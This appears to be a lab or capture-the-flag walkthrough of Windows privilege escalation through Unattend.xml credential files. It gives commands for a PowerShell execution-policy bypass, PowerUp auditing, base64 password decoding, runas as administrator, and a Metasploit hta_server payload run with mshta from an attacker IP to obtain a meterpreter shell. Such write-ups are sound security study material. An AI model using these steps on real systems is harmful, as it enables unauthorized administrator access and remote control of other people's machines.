### Windows Configuration Files
- The ***unattended Windows Setup Utility***, which is used to ***automate the mass installation/deployment*** of Windows on systems.
- This tool ***utilizes configuration files*** that contain specific configurations and user account credentials, specifically the Administrator account's password.
- If the Unattended Windows setup configuration files are left on the target system after installation, they can ***reveal user account credentials***.

### Unattended Windows Setup
- The Unattended Windows setup utility will typically utilize one of the following configuration files that contain user account and system configuration info:
	- C:\\Windows\\Panther\\Unattend.xml
	- C:\\Windows\\Panther\\Autounattend.xml
- As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be ***encoded in base64***.

***

### Practical

##### Using PowerUp
##### Import `PowerUp.ps1` script and `Invoke-PrivescAudit` Function
```
powershell -ep bypass # PowerShell execution policy bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```
We find the Unattended.xml file.

```
cat C:\Windows\Panther\Unattended.xml
```
We have discovered the password.

##### Decoding the Password with PowerShell
```
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
```

##### `runAs`
The `runas` command in PowerShell allows you to run programs or commands as a different user.
Execute the following command once you find the password:
```
runas.exe /user:administrator cmd
```

At this point we can get the flag, however, we can use `hta_server` module in metasploit to gain meterpreter session which offers more comprehensive control over the target system. 

##### Metasploit
```
use exploit/windows/misc/hta_server
run
```
This module hosts an HTML Application (HTA) that when opened will run a payload via PowerShell.

Copy the generated payload i.e. **“http://IP:8080/Bn75U0NL8ONS.hta"** and run it on cmd.exe with `mshta` command to gain the meterpreter shell.

##### Switch to Target Machine
```
mshta.exe http://IP:8080/Bn75U0NL8ONS.hta
```
We can expect a meterpreter shell.